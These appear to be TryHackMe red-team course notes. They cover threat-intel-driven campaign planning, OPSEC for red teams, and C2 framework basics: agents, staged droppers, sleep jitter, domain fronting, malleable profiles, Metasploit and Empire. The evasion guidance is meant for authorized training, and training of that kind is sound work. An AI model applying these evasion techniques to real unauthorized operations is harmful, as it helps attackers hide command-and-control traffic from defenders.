Other open-source and enterprise threat intelligence platforms can aid red teamers in adversary emulation and TTP mapping, such as,

- **Mandiant Advantage**
- **Ontic**
- **CrowdStrike Falcon**

**Other Red Team Applications of CTI**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/632bfc40ba7e07e3129e6b111de997ed.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/632bfc40ba7e07e3129e6b111de997ed.png)

CTI can also be used during engagement execution, emulating the adversary's behavioral characteristics, such as

- C2 Traffic
    - User Agents
    - Ports, Protocols
    - Listener Profiles
- Malware and Tooling
    - IOCs
    - Behaviors

---

The first behavioral use of CTI we will showcase is C2 (**C**ommand & **C**ontrol) traffic manipulation. A red team can use CTI to identify adversaries' traffic and modify their C2 traffic to emulate it.

An example of a red team modifying C2 traffic based on gathered CTI is [**malleable profiles**](https://www.cobaltstrike.com/help-malleable-c2). A malleable profile allows a red team operator to control multiple aspects of a C2's listener traffic.

Information to be implemented in the profile can be gathered from ISACs and collected IOCs or packet captures, including,

- Host Headers
- POST URIs
- Server Responses and Headers

The gathered traffic can aid a red team to make their traffic 
look similar to the targeted adversary to get closer to the goal of 
adversary emulation.

---

The second behavioral use of CTI
 is analyzing behavior and actions of an adversaries' malware and tools 
to develop your offensive tooling that emulates similar behaviors or has
 similar vital indicators.

An example of this could be an adversary using a custom dropper. The red team can emulate the dropper by,

- Identifying traffic
- Observing syscalls and API calls
- Identifying overall dropper behavior and objective
- Tampering with file signatures and IOCs

Intelligence and tools gathered from behavioral threat 
intelligence can aid a red team in preparing the specific tools they 
will use to action planned TTPs.

**Creating a Threat Intel Driven Campaign**

A
 threat-intel-driven campaign will take all knowledge and topics 
previously covered and combine them to create a well-planned and 
researched campaign.

The task flow in this room logically follows the same path you would take as a red team to begin planning a campaign,

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/5f49a9db84d1bc6a72cd784767f94bb1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/5f49a9db84d1bc6a72cd784767f94bb1.png)

1. Identify framework and general kill chain
2. Determine targeted adversary
3. Identify adversary's TTPs and IOCs
4. Map gathered threat intelligence to a kill chain or framework
5. Draft and maintain needed engagement documentation
6. Determine and use needed engagement resources (tools, C2 modification, domains, etc.)

---

In this task, we will be walking through a red team's thought process
 from beginning to end of planning a threat-intel-driven campaign.

The
 hardest part of planning a threat-intel-driven campaign can be mapping 
two different cyber frameworks. To make this process simpler we have 
provided a basic table comparing the **Lockheed Martin Cyber Kill Chain** and the **MITRE ATT&CK** framework.

| **Cyber Kill Chain** | **MITRE ATT&CK** |
| --- | --- |
| Recon | Reconnaissance |
| Weaponization | Execution |
| Delivery | Initial Access |
| Exploitation | Initial Access |
| Installation | Persistence / Defense Evasion |
| Command & Control | Command and Control |
| Actions on Objectives | Exfiltration / Impact |

To begin working through this task, download the required resources and launch the static site attached to this task.

Your team has already decided to use the Lockheed Martin cyber kill chain to emulate [APT 41](https://attack.mitre.org/groups/G0096/) as the adversary that best fits the client's objectives and scope.

## **OPSEC**

**Introduction**

Operations Security 
(OPSEC) is a term coined by the United States military. In the field of 
cybersecurity, let’s start with the definition provided by [NIST](https://csrc.nist.gov/glossary/term/opsec):

> “Systematic and proven process by which potential adversaries can be 
denied information about capabilities and intentions by identifying, 
controlling, and protecting generally unclassified evidence of the 
planning and execution of sensitive activities. The process involves 
five steps: identification of critical information, analysis of threats,
 analysis of vulnerabilities, assessment of risks, and application of 
appropriate countermeasures.”
> 

Let’s dive into the definition from a red team perspective. As a red 
team member, your potential adversaries are the blue team and third 
parties. The blue team is considered an adversary as we are attacking 
the systems they are hired to monitor and defend. Red vs. blue team 
exercises are common to help an organization understand what threats 
exist in a given environment and better prepare their blue team if a 
real malicious attack occurs. As red teamers, even though we are abiding
 by the law and authorized to attack systems within a defined scope, it 
does not change the fact that we are acting against the blue team's 
objectives and trying to circumvent their security controls. The blue 
team wants to protect their systems, while we want to penetrate them.

Denying any potential adversary the ability to gather information 
about our capabilities and intentions is critical to maintaining OPSEC. 
OPSEC is a process to *identify*, *control* and *protect* any information related to the planning and execution of our activities. Frameworks such as [Lockheed Martin's Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) and [MITRE ATT&CK](https://attack.mitre.org/) help
 defenders identify the objectives an adversary is trying to accomplish.
 MITRE ATT&CK is arguably at the forefront of reporting and 
classifying adversary tactics, techniques, and procedures (TTPs) and 
offers a publicly accessible knowledge base as publicly available threat
 intelligence and incident reporting as its primary data source.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2cda611755b8a85867f37ce46c20aff7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2cda611755b8a85867f37ce46c20aff7.png)

The OPSEC process has five steps:

1. Identify critical information
2. Analyse threats
3. Analyse vulnerabilities
4. Assess risks
5. Apply appropriate countermeasures

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c50e97c624bc345971f81e80fb3c2a3e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c50e97c624bc345971f81e80fb3c2a3e.png)

If the adversary discovers that you are scanning their network with 
Nmap (the blue team in our case), they should easily be able to discover
 the IP address used. For instance, if you use this same IP address to 
host a phishing site, it won’t be very difficult for the blue team to 
connect the two events and attribute them to the same actor.

OPSEC is not a solution or a set of rules; OPSEC is a five-step 
process to deny adversaries from gaining access to any critical 
information (defined in Task 2). We will dive into each step and see how
 we can improve OPSEC as part of our red team operations.

**Critical Information Identification**

What
 a red teamer considers critical information worth protecting depends on
 the operation and the assets or tooling used. In this setting, critical
 information includes, but is not limited to, the red team’s intentions,
 capabilities, activities, and limitations. Critical information 
includes any information that, once obtained by the blue team, would 
hinder or degrade the red team’s mission.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8db3f3679362574a35006f377f6b3268.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8db3f3679362574a35006f377f6b3268.png)

To identify critical information, the red team needs to use an 
adversarial approach and ask themselves what information an adversary, 
the blue team, in this case, would want to know about the mission. If 
obtained, the adversary will be in a solid position to thwart the red 
team’s attacks. Therefore, critical information is not necessarily 
sensitive information; however, it is any information that might 
jeopardise your plans if leaked to an adversary. The following are some 
examples:

- Client information that your team has learned. It's unacceptable to
share client specific information such as employee names, roles, and
infrastructure that your team has discovered. Sharing this type of
information should kept on need-to-know basis as it could compromise the integrity of the operation. The Principle of Least Privilege (PoLP)
dictates that any entity (user or process) must be able to access only
the information necessary to carry out its task. PoLP should be applied
in every step taken by the Red Team.
- Red team information, such as identities, activities, plans,
capabilities and limitations. The adversary can use such information to
be better prepared to face your attacks.
- Tactics, Techniques, and Procedures (TTP) that your team uses in order to emulate an attack.
- OS, cloud hosting provider, or C2 framework utilised by your team. Let’s say that your team uses [Pentoo](https://pentoo.github.io/) for penetration testing, and the defender knows this. Consequently,
they can keep an eye for logs exposing the OS as Pentoo. Depending on
the target, there is a possibility that other attackers are also using
Pentoo to launch their attacks; however, there is no reason to expose
your OS if you don’t have to.
- Public IP addresses that your red team will use. If the blue team
gains access to this kind of information, they could quickly mitigate
the attack by blocking all inbound and outbound traffic to your IP
addresses, leaving you to figure out what has happened.
- Domain names that your team has registered. Domain names play a
significant role in attacks such as phishing. Likewise, if the blue team figures out the domain names you will be using to launch your attacks,
they could simply block or sinkhole your malicious domains to neutralize your attack.
- Hosted websites, such as phishing websites, for adversary emulation.

**Threat Analysis**

After we identify critical information, we need to analyse threats. *Threat analysis refers to identifying potential adversaries and their intentions and capabilities*. Adapted from the US Department of Defense [(DoD) Operations Security (OPSEC) Program Manual](https://www.esd.whs.mil/Portals/54/Documents/DD/issuances/dodm/520502m.pdf), threat analysis aims to answer the following questions:

1. Who is the adversary?
2. What are the adversary’s goals?
3. What tactics, techniques, and procedures does the adversary use?
4. What critical information has the adversary obtained, if any?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/528fdefeb510a511d19fa0ba2496cc74.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/528fdefeb510a511d19fa0ba2496cc74.png)

The task of the red team is to emulate an actual attack so that the 
blue team discovers its shortcomings, if any, and becomes better 
prepared to face incoming threats. The blue team’s main objective is to 
ensure the security of the organization’s network and systems. The 
intentions of the blue team are clear; they want to keep the red team 
out of their network. Consequently, considering the task of the red 
team, the blue team is considered our adversary as each team has 
conflicting objectives. We should note that the blue team’s capabilities
 might not always be known at the beginning.

Malicious third-party players might have different intentions and 
capabilities and might pause a threat as a result. This party can be 
someone with humble capabilities scanning the systems randomly looking 
for low-hanging fruit, such as an unpatched exploitable server, or it 
can be a capable adversary targeting your company or your client 
systems. Consequently, the intentions and the capabilities of this third
 party can make them an adversary as well.

| Adversary | Intentions | Capabilities |
| --- | --- | --- |
| Blue Team | Keep intruders out | Not always known |
| Malicious third-party | Varies | Varies |

We consider any adversary with the intent and capability to take 
actions that would prevent us from completing our operation as a threat:

```
threat = adversary + intent + capability
```

In other words, an adversary without the intent or capability does not pose a threat for our purposes.

**Vulnerability Analysis**

After identifying 
critical information and analysing threats, we can start with the third 
step: analysing vulnerabilities. This is not to be confused with 
vulnerabilities related to cybersecurity. An *OPSEC vulnerability 
exists when an adversary can obtain critical information, analyse the 
findings, and act in a way that would affect your plans.*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8b33c14bf973ce276a4ab36ff2c2246d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8b33c14bf973ce276a4ab36ff2c2246d.png)

To better understand an OPSEC vulnerability as related to red 
teaming, we'll consider the following scenario. You use Nmap to discover
 live hosts on a target subnet and find open ports on live hosts. 
Moreover, you send various phishing emails leading the victim to a 
phishing webpage you're hosting. Furthermore, you're using the 
Metasploit framework to attempt to exploit certain software 
vulnerabilities. These are three separate activities; however, if you 
use the same IP address(es) to carry out these different activities, 
this would lead to an OPSEC vulnerability. Once any hostile/malicious 
activity is detected, the blue team is expected to take action, such as 
blocking the source IP address(es) temporarily or permanently. 
Consequently, it would take one source IP address to be blocked for all 
the other activities use this IP address to fail. In other words, this 
would block access to the destination IP address used for the phising 
server, and the source IP address using by Nmap and Metasploit 
Framework.

Another example of an OPSEC vulnerability would be an unsecured 
database that's used to store data received from phishing victims. If 
the database is not properly secured, it may lead to a malicious third 
party compromising the operation and could result in data being 
exfiltrated and used in an attack against your client's network. As a 
result, instead of helping your client secure their network, you would 
end up helping expose login names and passwords.

Lax OPSEC could also result in less sophisticated vulnerabilities. 
For instance, consider a case where one of your red team members posts 
on social media revealing your client's name. If the blue team monitors 
such information, it will trigger them to learn more about your team and
 your approaches to better prepare against expected penetration 
attempts.

**Risk Assessment**

We finished analysing the vulnerabilities, and now we can proceed to the fourth step: conducting a risk assessment. [NIST](https://csrc.nist.gov/glossary/term/risk_assessment)
 defines a risk assessment as "The process of identifying risks to 
organizational operations (including mission, functions, image, 
reputation), organizational assets, individuals, other organizations, 
and the Nation, resulting from the operation of an information system." 
In OPSEC, risk assessment requires learning the possibility of an event 
taking place along with the expected cost of that event. Consequently, 
this involves assessing the adversary’s ability to exploit the 
vulnerabilities.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8d32963e947b11b953927479960a7127.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8d32963e947b11b953927479960a7127.png)

Once the level of risk is determined, countermeasures can be 
considered to mitigate that risk. We need to consider the following 
three factors:

1. The efficiency of the countermeasure in reducing the risk
2. The cost of the countermeasure compared to the impact of the vulnerability being exploited.
3. The possibility that the countermeasure can reveal information to the adversary

Let’s revisit the two examples from the previous task. In the first 
example, we considered the vulnerability of scanning the network with 
Nmap, using the Metasploit framework, and hosting the phishing pages 
using the same public IP address. We analysed that this is a 
vulnerability as it makes it easier for the adversary to block our three
 activities by simply detecting one activity. Now let’s assess this 
risk. To evaluate the risk related to this vulnerability, we need to 
learn the possibility of one or more of these activities being detected.
 We cannot answer this without obtaining some information about the 
adversary’s capabilities. Let’s consider the case where the client has a
 Security Information and Event Management (SIEM) in place. A SIEM is a 
system that allows real-time monitoring and analysis of events related 
to security from different sources across the network. We can expect 
that a SIEM would make it reasonably uncomplicated to detect suspicious 
activity and connect the three events. As a result, we would assess the 
related risk as high. On the other hand, if we know that the adversary 
has minimal resources for detecting security events, we can assess the 
risk related to this vulnerability as low.

Let’s consider the second example of an unsecured database used to 
store data received from a phishing page. Based on data collected from 
several research groups using honeypots, we can expect various malicious
 bots to actively target random IP addresses on the Internet. Therefore,
 it is only a matter of time before a system with weak security is 
discovered and exploited.

**Countermeasures**

The final step is applying countermeasures. The US Department of Defense (DoD) [Operations Security (OPSEC) Program Manual](https://www.esd.whs.mil/Portals/54/Documents/DD/issuances/dodm/520502m.pdf) states, *“Countermeasures
 are designed to prevent an adversary from detecting critical 
information, provide an alternative interpretation of critical 
information or indicators (deception), or deny the adversary’s 
collection system.”*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0f237d64d2cd39d75a59f33ec0d2ca80.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0f237d64d2cd39d75a59f33ec0d2ca80.png)

Let’s revisit the two examples we presented in the Vulnerability 
Analysis task. In the first example, we considered the vulnerability of 
running Nmap, using the Metasploit framework, and hosting the phishing 
pages using the same public IP address. The countermeasure for this one 
seems obvious; use a different IP address for each activity. This way, 
you can ensure that if one activity was detected the public IP address 
is blocked, the other activities can continue unaffected.

In the second example, we considered the vulnerability of an 
unsecured database used to store data received from a phishing page. 
From a risk assessment perspective, we considered it as high risk due to
 malicious third parties potentially looking for random easy targets. 
The countermeasure, in this case, would be to ensure that the database 
is adequately secured so that the data cannot be accessed except by 
authorized personnel.

## **INTRO TO C2**

**Command and Control Framework Structure**

### What is a Command and Control Framework

While trying to digest the various components of a C2
 framework, it may be intimidating. However, they don’t have to be. In 
order to better understand what a C2 framework is at its most basic 
level, think of a Netcat listener (the C2 server) that is capable of 
handling many reverse shells calling back at once (C2 Agents). It’s a 
server but for reverse shells. Unlike Netcat, almost all C2 frameworks 
require a special payload generator. This is usually a feature that is 
built into the framework itself. For example, Metasploit is a C2 
Framework that has its own payload generator, MSFVenom.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/661abd734022d8a1f3050e90d3fb6861.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/661abd734022d8a1f3050e90d3fb6861.png)

*The Diagram above depicts three compromised clients calling back to a C2 Server.*

So what exactly makes C2
 frameworks better than a normal Netcat listener? It seems like all 
someone needs to do is implement session management into Netcat, and you
 have the same thing? While this is true, C2 frameworks shine in their 
“Post Exploitation” features.

### Command and Control Structure

### **C2 Server**

In order to understand a Command and Control framework, we must first start by understanding the various components of a C2 server. Let’s start with the most essential component - The C2 Server itself. The C2
 Server serves as a hub for agents to call back to. Agents will 
periodically reach out to the C2 server and wait for the operator’s 
commands.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5de5e62c5ba37013302790062b6b429e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5de5e62c5ba37013302790062b6b429e.png)

*This screenshot depicts a basic C2 server diagram.*

### **Agents / Payloads**

An agent is a program generated by the C2
 framework that calls back to a listener on a C2 server. Most of the 
time, this agent enables special functionality compared to a standard 
reverse shell. Most C2 Frameworks implement pseudo commands to make the 
C2 Operator’s life easier. Some examples of this may be a pseudo command
 to Download or Upload a file onto the system. It’s important to know 
that agents can be highly configurable, with adjustments on the timing 
of how often C2 Agents beacon out to a Listener on a C2 Server and much 
more.

### **Listeners**

On the most basic level, a listener is an application running on the C2 server that waits for a callback over a specific port or protocol.  Some examples of this are DNS, HTTP, and or HTTPS.

### **Beacons**

A Beacon is the process of a C2 Agent calling back to the listener running on a C2 Server.

### Obfuscating Agent Callbacks

### **Sleep Timers**

One key thing that some security analysts, anti-virus, 
and next-generation firewalls look for when attempting to identify 
Command and Control traffic is beaconing and the rate at which a device 
beacons out to a C2 server. Let’s say a firewall observed traffic that looks like so

- TCP/443 - Session Duration 3s, 55 packets sent, 10:00:05.000
- TCP/443 - Session Duration 2s, 33 packets sent, 10:00:10.000
- TCP/443 - Session Duration 3s, 55 packets sent, 10:00:15.000
- TCP/443 - Session Duration 1s, 33 packets sent, 10:00:20.000
- TCP/443 - Session Duration 3s, 55 packets sent, 10:00:25.000

A pattern is starting to form. The agent beacons out every 5 seconds; this means that it has a sleep timer of 5 seconds.

**Jitter**

Jitter takes the sleep timer and adds some variation to it; our C2 beaconing may now exhibit a strange pattern that may show activity that is closer to an average user:

- TCP/443 - Session Duration 3s, 55 packets sent, 10:00:03.580
- TCP/443 - Session Duration 2s, 33 packets sent, 10:00:13.213
- TCP/443 - Session Duration 3s, 55 packets sent, 10:00:14.912
- TCP/443 - Session Duration 1s, 33 packets sent, 10:00:23.444
- TCP/443 - Session Duration 3s, 55 packets sent, 10:00:27.182

The beaconing is now set at a semi-irregular pattern 
that makes it slightly more difficult to identify among regular user 
traffic. In more advanced C2
 frameworks, it may be possible to alter various other parameters, like 
“File” jitter or adding junk data to the payload or files being 
transmitted to make it seem larger than it actually is.

Sample Python3 code for Jitter may look like so:

`import random`

`sleep = 60`

`jitter = random.randint(-30,30)`

`sleep = sleep + jitter`

It's
 important to note that this is a fundamental example,  but it can be 
much more math-heavy, setting upper bounds and lower bounds, taking 
percentages of last sleep, and building on from there. Because this is 
an introduction room, we will spare you a complicated formula.

### Payload Types

Much like a regular Reverse Shell, there are two primary types of payloads that you may be able to use in your C2 Framework; **Staged** and **Stageless** payloads.

**Stageless Payloads**

Stageless Payloads are the simplest of the two; they contain the full C2
 agent and will call back to the C2 server and begin beaconing 
immediately. You can refer to the diagram below to gain a better 
understanding of how Stageless payloads operate.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e79d46d97f108842b9424ae5a134d2f8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e79d46d97f108842b9424ae5a134d2f8.png)

*This screenshot depicts a stageless payload calling back to a C2 server*

The steps for establishing C2 beaconing with a Stageless payload are as follows:

1. The Victim downloads and executes the Dropper

2. The beaconing to the C2 Server begins

**Staged Payloads**

Staged payloads require a callback to the C2
 server to download additional parts of the C2 agent. This is commonly 
referred to as a “Dropper” because it is “Dropped” onto the victim 
machine to download the second stage of our staged payload.  This is a 
preferred method over stageless payloads because a small amount of code 
needs to be written to retrieve the additional parts of the C2 agent 
from the C2 server. It also makes it easier to obfuscate code to bypass 
Anti-Virus programs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e6127ac6a295a1d9b01444757f711084.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e6127ac6a295a1d9b01444757f711084.png)

*This diagram depicts a dropper calling back to a C2 server for its second stage.*

The steps for establishing C2 beaconing with a Staged payload are as follows:

**1.** The Victim downloads and executes the Dropper

**2.** The Dropper calls back to the C2 Server for Stage 2

**3.** The C2 Server sends Stage 2 back to the Victim Workstation

**4.** Stage 2 is loaded into memory on the Victim Workstation

**5.** C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.

### Payload Formats

As you may know, Windows PE
 files (Executables) are not the only way to execute code on a system.  
Some C2 Frameworks support payloads in various other formats, for 
example:

- PowerShell Scripts
    - Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
- HTA Files
- JScript Files
- Visual Basic Application/Scripts
- Microsoft Office Documents

and many more. For more information on various other payload formats, you should review the [Weaponization](https://tryhackme.com/room/weaponization) room in the Initial Access module.

### Modules

Modules are a core component of any C2
 Framework; they add the ability to make agents and the C2 server more 
flexible. Depending on the C2 Framework, scripts must be written in 
different languages. Cobalt Strike has “Aggressor Scripts”, which are 
written in the “Aggressor Scripting Language”. PowerShell Empire has 
support for multiple languages, Metasploit’s Modules are written in 
Ruby, and many others are written in many other languages.

### **Post Exploitation Modules**

Post Exploitation modules are simply modules that deal 
with anything after the initial point of compromise, this could be as 
simple as running SharpHound.ps1 to find paths of lateral movement, or 
it could be as complex as dumping LSASS and parsing credentials in 
memory. For more information on Post Exploitation, refer to the [Post Exploitation Basics](https://tryhackme.com/room/postexploit) room.

### **Pivoting Modules**

One of the last major components of a C2
 Framework is its pivoting modules, making it easier to access 
restricted network segments within the C2 Framework. If you have 
Administrative Access on a system, you may be able to open up an “SMB 
Beacon”, which can enable a machine to act as a proxy via the SMB 
protocol. This may allow machines in a restricted network segment to 
communicate with your C2 server.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/da7b0247ff1db8e98c9358c39a0c3d21.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/da7b0247ff1db8e98c9358c39a0c3d21.png)

*This diagram depicts multiple victims with an SMB pivot calling back to a C2 server.*

### The diagram above shows how hosts within a restricted network segment call back to the C2 Server:1. The Victims call back to an SMB named pipe on another Victim in a non-restricted network segment.2. The Victim in the non-restricted network segment calls back to the C2 Server over a standard beacon.3. The C2 Server then sends commands back to the Victim in the non-restricted network segment.4. The Victim in the non-restricted network segment then forwards the C2 instructions to the hosts in the restricted segment.

### Facing the world

One
 important obstacle that all Red Teamers must overcome is placing 
infrastructure in plain view. There are many different methods to do 
this; one of the most popular methods is called "Domain Fronting".

**Domain Fronting**

Domain
 Fronting utilizes a known, good host (for example) Cloudflare. 
Cloudflare runs a business that provides enhanced metrics on HTTP
 connection details as well as caching HTTP connection requests to save 
bandwidth.  Red Teamers can abuse this to make it appear that a 
workstation or server is communicating with a known, trusted IP Address.
 Geolocation results will show wherever the nearest Cloudflare server 
is, and the IP Address will show as ownership to Cloudflare.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cd1ea19e9e0d7bef0d8ec6615061335b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cd1ea19e9e0d7bef0d8ec6615061335b.png)

*This diagram shows an example HTTP beacon from a compromised device.*

### The diagram above depicts how Domain Fronting works:1. The C2 Operator has a domain that proxies all requests through Cloudflare. 2. The Victim beacons out to the C2 Domain.3. Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.4. The C2 Server then responds to Cloudflare with the C2 Commands.**5.** The Victim then receives the command from Cloudflare.

**C2 Profiles**

The
 next technique goes by several names by several different products, 
"NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite",  "Malleable HTTP
 C2 Profiles", and many others. However, they are all more or less the 
same. All of the Proxy features more or less allow a user to control 
specific elements of the incoming HTTP request. Let's say an incoming 
connection request has an "X-C2-Server" header; we could explicitly 
extract this header using the specific technology that is at your 
disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) 
and ensure that your C2 server responds with C2 based responses. Whereas
 if a normal user queried the HTTP Server, they might see a generic 
webpage. This is all dependent on your configuration.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/22eac0e3ab2de3f61d57e858cee3e33e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/22eac0e3ab2de3f61d57e858cee3e33e.png)

*A Compromised Device and Security Analyst reach out to a C2 server, only the Compromised device gets a C2 Beacon back - the Analyst gets Cloudflare's website back.*

The diagram above depicts how C2 profiles work:

1. The Victim beacons out to the C2 Server with a custom header in the HTTP request, while a SOC Analyst has a normal HTTP Request

2. The requests are proxied through Cloudflare

3. The C2 Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.

**4.** The C2 Server responds to the client and responds to the Analyst/Compromised device.

Because HTTPS requests are encrypted, extracting specific headers (ex: X-C2-Server,
 or Host) may be impossible. By using C2 Profiles, we may be able to 
hide our C2 server from the prying eyes of a Security Analyst. For more 
information on how C2 profiles can be powerful, see this blog post on [Understanding Malleable C2 Profiles for Cobalt Strike](https://blog.zsec.uk/cobalt-strike-profiles/).

### Common C2 Frameworks

Throughout your journey, you may encounter many different C2
 Frameworks; we will discuss a few popular C2 Frameworks that are widely
 used by Red Teamers and Adversaries alike.  We will be dividing this 
into two sections:

- Free
- Premium/Paid

You may ask some questions like “Why would I use a premium or paid C2
 framework?”, and this is an excellent question. Premium/Paid C2 
frameworks usually are less likely to be detected by Anti-Virus vendors.
 This is not to say that it's impossible to be detected, just that 
open-source C2 projects are generally well understood, and signatures 
can be easily developed.

Usually, premium C2
 frameworks generally have more advanced post-exploitation modules, 
pivoting features, and even feature requests that open-source software 
developers may sometimes not fulfill. For example, one feature Cobalt 
Strike offers that most other C2 frameworks do not is the ability to 
open a VPN tunnel from a beacon. This can be a fantastic feature if a 
Proxy does not work well in your specific situation. You must do your 
research to find out what will work best for your team.

### Free C2 Frameworks

**Metasploit**

The [Metasploit Framework](https://www.metasploit.com/), developed and maintained by Rapid7, is one of the most popular Exploitation and Post Exploitation frameworks (C2) that is publicly available and is installed on most penetration testing distributions.

**MSFConsole
        

           `root@kali$ msfconsole                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.1.12-dev                          ]
+ -- --=[ 2177 exploits - 1152 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 >`**

**Armitage**

[Armitage](https://web.archive.org/web/20211006153158/http://www.fastandeasyhacking.com/) is an extension of the Metasploit
 Framework - it adds a Graphical user interface and is written in Java, 
and is incredibly similar to Cobalt Strike. This is because they were 
both developed by Raphael Mudge. Armitage offers an easy way to 
enumerate and visualize all of your targets. Aside from looking a lot 
like Cobalt Strike, it even offers some unique features. One of the most
 popular can be found in the “Attacks” menu; This feature is known as 
the Hail Mary attack, which attempts to run all exploits for the 
services running on a specific workstation. Armitage really is “Fast and
 Easy Hacking”.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6fc808991c2ea5a5faae2a271f9bf907.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6fc808991c2ea5a5faae2a271f9bf907.png)

*A Screenshot of the Armitage UI*

**Powershell Empire/Starkiller**

[Powershell Empire](https://bc-security.gitbook.io/empire-wiki/) and [Starkiller](https://github.com/BC-SECURITY/Starkiller) is another incredibly popular C2
 originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. 
Currently, the project has been discontinued and has been picked up by 
the BC Security team (Cx01N, Hubbl3, and _Vinnybod). Empire features 
agents written in various languages compatible with multiple platforms, 
making it an incredibly versatile C2. For more information on Empire, we
 recommend you take a look at the [Powershell Empire](https://tryhackme.com/room/rppsempire) room.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7605d1d88a01604402dcde1878a8acd0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7605d1d88a01604402dcde1878a8acd0.png)

*A Screenshot of the Starkiller UI*

**Covenant**

[Covenant](https://github.com/cobbr/Covenant) by Ryan Cobb is the last free C2
 Framework we will be covering - By far, it is one of the most unique C2
 Frameworks being written in C#. Unlike Metasploit/Armitage, It’s 
primarily used for post-exploitation and lateral movement with HTTP, 
HTTPS, and SMB listeners with highly customizable agents.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/55f84861830c1bc50d2b251bda883019.PNG](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/55f84861830c1bc50d2b251bda883019.PNG)

*A Screenshot of the Covenant UI*

